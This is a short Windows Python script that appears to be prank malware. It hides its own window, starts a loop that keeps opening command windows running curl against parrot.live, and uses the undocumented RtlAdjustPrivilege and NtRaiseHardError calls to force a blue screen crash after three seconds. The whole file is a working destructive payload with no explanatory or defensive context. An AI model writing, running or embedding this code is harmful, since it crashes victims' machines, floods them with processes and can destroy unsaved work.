import os
import ctypes
import ctypes.wintypes
import win32gui, win32con
from threading import Thread
from playsound import playsound
import time



the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)


def parrot():
    while True:
        os.system('start cmd /k curl parrot.live')
        os.system('start cmd /k curl parrot.live')
        os.system('start cmd /k curl parrot.live')
        os.system('start cmd /k curl parrot.live')
        os.system('start cmd /k curl parrot.live')

def bluescreen():
    time.sleep(3)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))


if __name__ == '__main__':
    Thread(target = bluescreen).start()
    Thread(target = parrot).start()
    

